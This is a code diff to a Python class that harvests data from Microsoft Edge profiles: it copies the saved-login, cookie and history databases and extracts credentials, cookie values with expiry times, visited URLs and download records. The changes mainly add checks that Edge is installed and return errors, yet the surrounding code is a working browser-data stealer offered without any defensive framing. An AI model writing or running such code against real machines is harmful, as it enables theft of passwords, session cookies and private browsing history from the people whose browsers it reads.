@@ -92,6 +92,7 @@ class MicrosoftEdge:
                         db.close()
                         os.remove("login_data_copy.db")
                 return  credentials
+            return "Microsoft Edge is not installed!!!"
         except Exception as e:
             return e
         
@@ -107,80 +108,87 @@ class MicrosoftEdge:
                     data_cookies += f"Cookies expires : {cookie.expires} \n\n"
                     cookies_data += data_cookies   
                 return cookies_data
+            return "Microsoft Edge is not installed!!!"
         except Exception as e:
             return e
+        
     def get_path(self, file):
         try:
-            for filename in os.listdir( self.home_path):
-                profile_path = os.path.join( self.home_path, filename)
-                if os.path.isdir(profile_path):
-                    logins_path = os.path.join(profile_path, file)
-                    if os.path.isfile(logins_path):
-                        return logins_path
-            return None
+            if self.get_edge_install():
+                for filename in os.listdir( self.home_path):
+                    profile_path = os.path.join( self.home_path, filename)
+                    if os.path.isdir(profile_path):
+                        logins_path = os.path.join(profile_path, file)
+                        if os.path.isfile(logins_path):
+                            return logins_path
+                return None
+            return "Microsoft Edge is not installed!!!"
         except Exception as e:
-            print(e)
+            return e
+            
     def edge_history(self):
         try:
-            historical=""
-            history_path= self.get_path("History")
-            if history_path:
-                new_data = shutil.copy2(history_path,"history.db")
-                conn = sqlite3.connect(new_data)
-                curs = conn.cursor()
-                curs.execute("SELECT url, title, last_visit_time From urls")
-                resluts=curs.fetchall()
-                for result in resluts:
-                    # print(result)
-                    hist= f"Url: {result[0]}\n"
-                    hist+= f"Title: {result[1]}\n"
-                    visit_time = self.edge_date_time(result[2])
-                    hist+= f"Visite Time: { visit_time}\n\n"
-                    historical +=hist
-                curs.close()
-                conn.close()
-                os.unlink("history.db")
-                return  (historical.replace('\n','\n\n')).encode('utf-8').split(b'\n\n')
+            if self.get_edge_install():
+                historical=""
+                history_path= self.get_path("History")
+                if history_path:
+                    new_data = shutil.copy2(history_path,"history.db")
+                    conn = sqlite3.connect(new_data)
+                    curs = conn.cursor()
+                    curs.execute("SELECT url, title, last_visit_time From urls")
+                    resluts=curs.fetchall()
+                    for result in resluts:
+                        # print(result)
+                        hist= f"Url: {result[0]}\n"
+                        hist+= f"Title: {result[1]}\n"
+                        visit_time = self.edge_date_time(result[2])
+                        hist+= f"Visite Time: { visit_time}\n\n"
+                        historical +=hist
+                    curs.close()
+                    conn.close()
+                    os.unlink("history.db")
+                    return  (historical.replace('\n','\n\n')).encode('utf-8').split(b'\n\n')
+                return "Microsoft Edge is not installed!!!"
         except Exception as e:
-            print(e)
+            return e
             
     def edge_downloads(self):
         try:
-            historical=""
-            history_path= self.get_path("History")
-            if history_path:
-                new_data = shutil.copy2(history_path,"history.db")
-                conn = sqlite3.connect(new_data)
-                curs = conn.cursor()
-                curs.execute("SELECT current_path, target_path, start_time,end_time, received_bytes,total_bytes,referrer,tab_url,tab_referrer_url,last_modified,mime_type,original_mime_type  FROM downloads")
-                resluts=curs.fetchall()
-                # print(resluts)
-                for result in resluts:
-                    # print(result)
-                    hist= f"Current Path: {result[0]}\n"
-                    hist+= f"Target Path: {result[1]}\n"
-                    hist+= f"Start Time: {self.edge_date_time(result[2])}\n"
-                    hist+= f"End Time: {self.edge_date_time(result[3])}\n"
-                    hist+= f"Receieved Data: {self.convert_size(result[4])}\n"
-                    hist+= f"Total Data: {self.convert_size(result[5])}\n"
-                    hist+= f"Referrer web: {result[6]}\n"
-                    hist+= f"Tab Url: {result[7]}\n"
-                    hist+= f"Tab Referrer Urls: {result[8]}\n"
-                    hist+= f"Last Modified: {result[9]}\n"
-                    hist+= f"Mime Type: {result[10]}\n"
-                    hist+= f"Original Mime Type: {result[11]}\n\n"
+            if self.get_edge_install():
+                historical=""
+                history_path= self.get_path("History")
+                if history_path:
+                    new_data = shutil.copy2(history_path,"history.db")
+                    conn = sqlite3.connect(new_data)
+                    curs = conn.cursor()
+                    curs.execute("SELECT current_path, target_path, start_time,end_time, received_bytes,total_bytes,referrer,tab_url,tab_referrer_url,last_modified,mime_type,original_mime_type  FROM downloads")
+                    resluts=curs.fetchall()
+                    # print(resluts)
+                    for result in resluts:
+                        # print(result)
+                        hist= f"Current Path: {result[0]}\n"
+                        hist+= f"Target Path: {result[1]}\n"
+                        hist+= f"Start Time: {self.edge_date_time(result[2])}\n"
+                        hist+= f"End Time: {self.edge_date_time(result[3])}\n"
+                        hist+= f"Receieved Data: {self.convert_size(result[4])}\n"
+                        hist+= f"Total Data: {self.convert_size(result[5])}\n"
+                        hist+= f"Referrer web: {result[6]}\n"
+                        hist+= f"Tab Url: {result[7]}\n"
+                        hist+= f"Tab Referrer Urls: {result[8]}\n"
+                        hist+= f"Last Modified: {result[9]}\n"
+                        hist+= f"Mime Type: {result[10]}\n"
+                        hist+= f"Original Mime Type: {result[11]}\n\n"
 
-                    historical +=hist
-                
-                curs.close()
-                conn.close()
-                os.unlink("history.db")
-                return  (historical.replace('\n','\n\n')).encode('utf-8').split(b'\n\n')
+                        historical +=hist
+                    
+                    curs.close()
+                    conn.close()
+                    os.unlink("history.db")
+                    return  (historical.replace('\n','\n\n')).encode('utf-8').split(b'\n\n')
+                return "Microsoft Edge is not installed!!!"
         except Exception as e:
-            print(e)
+            return e
             
 edge_browser = MicrosoftEdge()
-# edge_password_lines = [line for line in  edge_browser.get_edge_creds().split("\n") if not line.startswith("Password")]
-# print(edge_password_lines)
-# print(edge_browser.edge_downloads())
+
 
